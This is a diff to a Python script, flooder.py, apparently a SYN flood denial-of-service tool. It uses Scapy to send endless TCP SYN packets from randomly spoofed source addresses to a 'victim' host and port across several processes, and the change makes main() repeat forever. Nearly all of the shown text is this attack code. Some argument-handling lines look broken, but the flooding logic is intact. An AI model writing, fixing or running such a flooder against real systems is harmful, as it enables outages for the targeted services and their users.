@@ -36,28 +36,35 @@ def get_args():
     # python3 flooder.py 192.168.2.65 -a 999999999 -p 8082
     
     # python3 flooder.py --host 192.168.2.240 --port 8082 --amount 999999999 --thread 10
-    parser.add_argument('h', '--host', required=True, help="Victim's IP Addr")
-    parser.add_argument('-p', '--port', type=int, help="Target Port (default ports are 8080/8081/8082)", default=DEFAULT_PORT)
-    parser.add_argument('-a', '--amount', type=int, help="Amount of packets (default are infinitity)", default=DEFAULT_PACK)
-    parser.add_argument('-t', '--thread', type=int, help="Number of multi-processes", default=DEFAULT_PROCESS)
+    parser.add_argument('-host', '--host', required=True, help="Victim's IP Addr")
+    parser.add_argument('-port', '--port', type=int, help="Target Port (default ports are 8080/8081/8082)", default=DEFAULT_PORT)
+    parser.add_argument('-amount', '--amount', type=int, help="Amount of packets (default are infinitity)", default=DEFAULT_PACK)
+    parser.add_argument('-thread', '--thread', type=int, help="Number of multi-processes", default=DEFAULT_PROCESS)
         
+    return parser.parse_args()
+    #args = parser.parse_args()
     
-    args = parser.parse_args()
     # return h -p -a -t
-    return args.target, args.port, args.amount, args.process
+    #return args.target, args.port, args.amount, args.process
 
 
-def syn_flood(target_ip, dPort, packets_to_send, process):
+def sync_flood():
+    
+    # Instantiate all required params before looping
+    target, port, amount, process = get_args()
     
     #print("Sending packets to the target...")
     # As we know how many packets to send, use for loop
     
-    for _ in range(packets_to_send):
+    
+    
+    for _ in range(amount):
     #while True:
         seq_n = random.randint(0, MAX_PORTS)
         # srcPort
         sPort = random.randint(0, MAX_PORTS)
         Window = random.randint(0, MAX_PORTS)
+        
         # Calling back random IP returned from def random_IP_addr()
         src_ip = random_IP_addr()
         
@@ -65,21 +72,12 @@ def syn_flood(target_ip, dPort, packets_to_send, process):
         # sport = Source Port
         # dport = Destination Port
         # seq = sequence ; seq_n = sequetial number
-        packet = ScapyIP(dst=target_ip, src=src_ip)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
+        packet = ScapyIP(dst=target, src=src_ip)/TCP(sport=sPort, dport=port, flags="S", seq=seq_n, window=Window)
         send(packet, verbose=0)
         
     #print("Sent all packets :D")
     #print(f'Sent all the packets {packet} from src_IP:sPort {src_IP}:{sPort} to Target_IP:dPort {Target_IP}:{dPort}')
-        
-def do_flood():
-    
-    # Receiving all arguments Target_IP, dPort, packets_to_send from syn_flood()
-    target_ip, dPort, packets_to_send, process = get_args()    
-    
-    #syn_flood(target_ip, dPort, packets_to_send)
-    syn_flood(target_ip, dPort, packets_to_send, process)
-    
-    
+           
     
 def main():
     
@@ -93,22 +91,22 @@ def main():
     #     {'func': print_cube, 'args':(3,)},
     #     {'func': print_square, 'args': (4,)}
     # ]
-    
-    # Receiving all arguments Target_IP, dPort, packets_to_send from syn_flood()
-    target_ip, dPort, packets_to_send, process = get_args()  
-        
-    # Number of processes
-    #number_of_processes = input_processes
-    input_processes = process
+            
+    # Number of processes from users' terminal input
+    process_input = DEFAULT_PROCESS
     
     # List to keep track of processes
-    processes = [multiprocessing.Process(target=do_flood) for _ in range(input_processes)]
+    processes = [multiprocessing.Process(target=sync_flood) for _ in range(process_input)]
 
+    # forEach process in processes
     for process in processes:
         process.start()
     
+    # Joining each process to our thread pool
+    for i, process in enumerate(processes):
+        process.join()
+        print(f'Process i is alive?\n{ process.is_alive()}')
     
-
     # **** Multi-callbacks :D
     # Loop over the Jobs & create a process for each one
     # for i in range(number_of_processes):
@@ -145,14 +143,11 @@ def main():
     # for i, process in enumerate(process):
     #     p.join()
     #     print(f'Process i is alive?\n{p.is_alive()}')
-    
-    for i, process in enumerate(processes):
-        process.join()
-        print(f'Process i is alive?\n{ process.is_alive()}')
-    
+        
     
 # Fucking Windows checks for whether this is the main script
 # and NOT a module...    
 if __name__ == '__main__':
-    main()
+    while True:
+        main()
     
